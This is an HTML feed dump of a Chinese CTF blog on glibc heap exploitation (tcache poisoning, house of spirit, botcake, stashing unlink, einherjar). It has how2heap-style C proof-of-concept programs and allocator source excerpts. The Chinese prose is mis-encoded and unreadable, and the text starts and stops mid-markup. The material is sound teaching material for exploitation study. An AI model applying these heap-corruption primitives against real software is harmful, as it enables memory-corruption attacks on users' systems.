class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br><span class="hljs-comment">//bck=unsorted_chunk-&gt;bk=fake_chunk</span><br>size = chunksize (victim);<br><span class="hljs-comment">//size=chunksize(unsorted_chunk)</span><br><br>unsorted_chunks (av)-&gt;bk = bck;<br><span class="hljs-comment">//unsorted_bin-&gt;bk=fake_chunk</span><br>bck-&gt;fd = unsorted_chunks (av);<br><span class="hljs-comment">//fake_chunk-&gt;fd=unsorted_bin</span><br><span class="hljs-comment">//fake_chunké“¾å…¥unsorted bin</span><br><br>victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<br><span class="hljs-comment">//bck=large_bin</span><br>fwd = bck-&gt;fd;<br><span class="hljs-comment">//fwd=large_bin-&gt;fd=large_chunk</span><br><br>victim-&gt;fd_nextsize = fwd;<br><span class="hljs-comment">//unsorted_chunk-&gt;fd_nextsize=large_chunk</span><br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br><span class="hljs-comment">//unsorted_chunk-&gt;bk_nextsize=large_chunk-&gt;bk_nextsize</span><br><span class="hljs-comment">// =fake_chunk-0x18-5</span><br>fwd-&gt;bk_nextsize = victim;<br><span class="hljs-comment">//large_chunk-&gt;bk_nextsize=unsorted_chunk</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize</span><br><span class="hljs-comment">//=(fake_chunk-0x18-5)-&gt;fd_nextsize</span><br><span class="hljs-comment">//=fake_chunk+3=unsorted_chunk</span><br><span class="hljs-comment">//ä¼ªé€ fake_chunkçš„sizeï¼Œsizeæˆå‘˜ä¸ºunsorted_chunkåœ°å€çš„æœ€é«˜ä¸‰å­—èŠ‚</span><br><span class="hljs-comment">//heapåœ°å€æœ€é«˜ä¸‰å­—èŠ‚ä¸º0ï¼Œç¬¬å››å­—èŠ‚ä¸º0x56æˆ–0x55</span><br><br>bck = fwd-&gt;bk;<br><span class="hljs-comment">//bck=large_chunk-&gt;bk=fake_chunk+8</span><br>mark_bin (av, victim_index);<span class="hljs-comment">//æ ‡è¯†binmap</span><br>victim-&gt;bk = bck;<br><span class="hljs-comment">//unsorted_chunk-&gt;bk=fake_chunk+8</span><br>victim-&gt;fd = fwd;<br><span class="hljs-comment">//unsorted_chunk-&gt;fd=large_chunk</span><br>fwd-&gt;bk = victim;<br><span class="hljs-comment">//large_chunk-&gt;bk=unsorted_chunk</span><br>bck-&gt;fd = victim;<br><span class="hljs-comment">//(fake_chunk+8)-&gt;fd=fake_chunk-&gt;bk=unsorted_chunk</span><br><span class="hljs-comment">//ä¼ªé€ fake_chunkçš„bkæŒ‡å‘åˆæ³•åœ°å€</span><br></code></pre></td></tr></table></figure><p>ä¼ªé€ çš„sizeä¸º0x56æˆ–0x55ï¼Œæ‰€ä»¥mallocä¸€ä¸ª0x48çš„chunkï¼ˆå®é™…å¤§å°0x50ï¼‰ä¼šè¿”å›fake_chunk</p><h2 id="2-28ä»¥å"><a href="#2-28ä»¥å" class="headerlink" title="2.28ä»¥å"></a>2.28ä»¥å</h2><p>_int_mallocä¸­æ•´ç†unsorted binæ—¶æ–°å¢æ£€æŸ¥chunkçš„è¿æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcacheç›¸å…³</title>
    <link href="/2023/02/08/tcache%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/02/08/tcache%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>tcacheçš„å‡ ç§åˆ©ç”¨éƒ½æŒºç®€å•çš„ï¼Œå°±æ‰“ä¸ªåŒ…æ”¾ä¸€èµ·äº†(decrypt safing linkingè§safe linkingç¯‡)</p><span id="more"></span><h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><h2 id="2-31ä»¥å‰"><a href="#2-31ä»¥å‰" class="headerlink" title="2.31ä»¥å‰"></a>2.31ä»¥å‰</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// disable buffering</span><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">size_t</span> stack_var;<br><span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><br>b[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)&amp;stack_var;<br><br><span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><br>assert((<span class="hljs-type">long</span>)&amp;stack_var == (<span class="hljs-type">long</span>)c);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ›´æ”¹tcacheä¸­chunkçš„fdæŒ‡é’ˆï¼Œæ¯”fastbinæ›´æ–¹ä¾¿å› ä¸ºæ²¡æœ‰sizeçš„æ£€æŸ¥</p><h2 id="2-32ä»¥å"><a href="#2-32ä»¥å" class="headerlink" title="2.32ä»¥å"></a>2.32ä»¥å</h2><p>æ–°å¢chunkåœ°å€å¯¹é½æ£€æŸ¥å’Œsafe linkingæœºåˆ¶<br>æ³¨æ„fdæŒ‡å‘fake chunkçš„åœ°å€è¦å¯¹é½0x10å¹¶åŠ å¯†</p><h1 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h1><p>ç›´æ¥free fake chunkæ”¾è¿›tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><span class="hljs-comment">//å †åˆå§‹åŒ–</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a; <span class="hljs-comment">//pointer that will be overwritten</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>]; <span class="hljs-comment">//fake chunk region</span><br><br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><span class="hljs-comment">//æ³¨æ„åœ°å€å¯¹é½0x10</span><br>a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br><br>assert((<span class="hljs-type">long</span>)b == (<span class="hljs-type">long</span>)&amp;fake_chunks[<span class="hljs-number">2</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><p>åŸç†æœ‰ç‚¹ç±»ä¼¼äºfastbin dup consolidateï¼Œå°†chunkåŒæ—¶æ”¾è¿›unsorted binå’Œtcacheå½¢æˆuafçš„æ•ˆæœ</p><h2 id="2-31ä»¥å‰-1"><a href="#2-31ä»¥å‰-1" class="headerlink" title="2.31ä»¥å‰"></a>2.31ä»¥å‰</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br><br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br><span class="hljs-comment">//å¡«æ»¡tcache</span><br><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(prev);<br><span class="hljs-comment">//aï¼Œprevåˆå¹¶æˆä¸€ä¸ª0x220çš„chunkè¿›å…¥unsorted binï¼Œä¸ºprevçš„åœ°å€</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">free</span>(a);<br><span class="hljs-comment">//aåŒæ—¶ä½äºtcacheå’Œunsorted bin</span><br><br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br><span class="hljs-comment">//ä»prevåˆ‡å‰²ä¸€å—0x130çš„chunkï¼Œå¯ä»¥æ§åˆ¶açš„fd</span><br><br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br><span class="hljs-comment">//æ›´æ”¹açš„fd</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <br>    assert(c==stack_var);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-32ä»¥å-1"><a href="#2-32ä»¥å-1" class="headerlink" title="2.32ä»¥å"></a>2.32ä»¥å</h2><p>æ³¨æ„safe-linkingæœºåˆ¶</p><h1 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target;<br><br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br><span class="hljs-comment">//tcacheä¸­å¡«6ä¸ªchunk</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br><span class="hljs-comment">//å¡«æ»¡tcache</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//0å’Œ2è¿›å…¥unsorted bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br><br><span class="hljs-comment">//0å’Œ2è¿›å…¥small bin</span><br><span class="hljs-comment">//small bin-&gt;2-&gt;0</span><br><span class="hljs-comment">//small binä¸­çš„ä¸¤ä¸ªchunkä¹Ÿå¯ä»¥é€šè¿‡åˆ‡å‰²last remainder+callocå®ç°</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">// size &gt; 0x90</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><span class="hljs-comment">//ä»tcacheä¸­å–ä¸¤ä¸ªï¼Œç°åœ¨tcacheä¸­æœ‰äº”ä¸ªchunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br><span class="hljs-comment">//æ›´æ”¹2çš„bkä¸ºstack_var</span><br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<br><br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br><span class="hljs-comment">//ä»small binä¸­æ‹¿å‡º0ï¼ˆcallocä¸ä»tcacheä¸­å–chunkï¼‰</span><br><span class="hljs-comment">//å°†2å’Œstack_varæ”¾è¿›tcache</span><br><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);  <br><span class="hljs-comment">//ä»tcacheä¸­å–å‡ºstack_var </span><br><br>    assert(target == &amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h1><p>2.26-2.28ç‰ˆæœ¬tcacheæ²¡æœ‰double freeçš„æ£€æŸ¥ï¼Œå¯ä»¥éšä¾¿double free</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of einherjar</title>
    <link href="/2023/02/06/house-of-einherjar/"/>
    <url>/2023/02/06/house-of-einherjar/</url>
    
    <content type="html"><![CDATA[<p>å¾ˆå¤§èƒ†çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰è¢«å“åˆ°(*Î¦çš¿Î¦*)</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>å¦‚æœç¨‹åºå­˜åœ¨of by nullæ¼æ´ä¸”èƒ½æ³„éœ²å †åœ°å€çš„è¯å°±èƒ½ä½¿ç”¨è¿™ä¸ªæ–¹æ³•</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-25ä»¥å‰"><a href="#2-25ä»¥å‰" class="headerlink" title="2.25ä»¥å‰"></a>2.25ä»¥å‰</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* d;<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//not used</span><br>fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//not used now</span><br>fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br>a[real_a_size] = <span class="hljs-number">0</span>; <br><br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><span class="hljs-built_in">free</span>(b);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>mallocä¸€ä¸ªchunkï¼ˆaï¼‰ç”¨äºæ§åˆ¶ä¸‹ä¸€ä¸ªç”³è¯·çš„chunkï¼ˆbï¼‰çš„presizeå’Œpreinuseä½</li><li>ä¼ªé€ fake chunkçš„fdã€bkã€fd_nextsizeå’Œbk_nextsizeç»•è¿‡unlinkçš„æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd;      \<br>BK = P-&gt;bk;      \<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>â€¦â€¦<br><br><span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      \<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>malloc_printerr (check_action,      \<br><span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br>P, AV);      \<br></code></pre></td></tr></table></figure></li><li>mallocä¸€ä¸ªunsorted binèŒƒå›´çš„chunkï¼ˆbï¼‰ï¼Œç”¨äºè§¦å‘å‘ä¸‹åˆå¹¶</li><li>a[real_a_size] &#x3D; 0åˆ©ç”¨of by nullä¿®æ”¹bçš„preinuseä½ï¼Œåœ¨free(b)çš„æ—¶å€™è§¦å‘å‘ä¸‹åˆå¹¶</li><li>è®¡ç®—ä»båˆ°fake chunkçš„åç§»ï¼Œå‡å»çš„0x10æ˜¯bçš„sizeå’Œpresize</li><li>ä¿®æ”¹bçš„presizeä¸ºfake_size</li><li>ä¿®æ”¹fake chunkçš„sizeä¸ºfake_sizeï¼ˆä¸æ”¹ä¹Ÿè¡Œï¼Œè¿™ä¸ªç‰ˆæœ¬æ²¡æ£€æŸ¥ï¼‰</li><li>free(b)è§¦å‘å‘ä¸‹åˆå¹¶</li><li>å†ç”³è¯·chunkçš„æ—¶å€™å°±ä¼šä»åˆå¹¶çš„chunké‡Œåˆ‡å‰²</li></ul><h2 id="2-26-2-28"><a href="#2-26-2-28" class="headerlink" title="2.26-2.28"></a>2.26-2.28</h2><ul><li>æœ‰äº†tcacheï¼Œç”³è¯·çš„chunkè¦åœ¨tcacheçš„èŒƒå›´å¤–</li><li>2.26unlinkå¢åŠ äº†æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta"><span class="hljs-comment">//sizeå’Œnext chunkçš„presizeçš„æ£€æŸ¥</span></span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \<br>    FD = P-&gt;fd;      \<br>    BK = P-&gt;bk;     